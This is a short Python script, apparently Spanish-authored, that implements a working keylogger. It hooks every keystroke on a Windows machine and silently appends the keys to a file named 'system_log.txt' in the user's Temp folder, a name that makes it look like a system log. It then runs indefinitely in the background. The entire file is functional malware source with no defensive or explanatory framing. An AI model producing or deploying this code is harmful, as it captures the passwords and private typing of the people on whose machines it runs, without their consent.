import time
import keyboard
import os
import sys

def keylogger_background():
    log_file = os.path.join(os.path.expanduser("~"), "AppData", "Local", "Temp", "system_log.txt")
    
    def guardar_datos(datos):
        try:
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(datos)
        except Exception as e:
            pass

    def on_key(event):
        if event.event_type == keyboard.KEY_DOWN:
            special_keys = {
                'space': ' ',
                'enter': '\n', 
                'backspace': '',  
                'tab': '    ',    
                'shift': '',
                'ctrl': '',
                'alt': '',
                'caps lock': '[BLOQ_MAYUS]',
                'esc': '[ESC]',
                'windows': '[WIN]',
                'right shift': '',
                'left shift': '',
                'right ctrl': '',
                'left ctrl': '',
                'right alt': '',
                'left alt': '',
                'menu': '[MENU]'
            }
            
            key_char = special_keys.get(event.name, event.name)
            if event.name in ['shift', 'ctrl', 'alt', 'right shift', 'left shift', 
                            'right ctrl', 'left ctrl', 'right alt', 'left alt', 'windows']:
                return
            if key_char:
                guardar_datos(key_char)
              
    print("El programa ahora corre en segundo plano...")

    keyboard.hook(on_key)
    
    try:
        while True:
            time.sleep(60)  
    except:
        pass

if __name__ == "__main__":
    keylogger_background()    
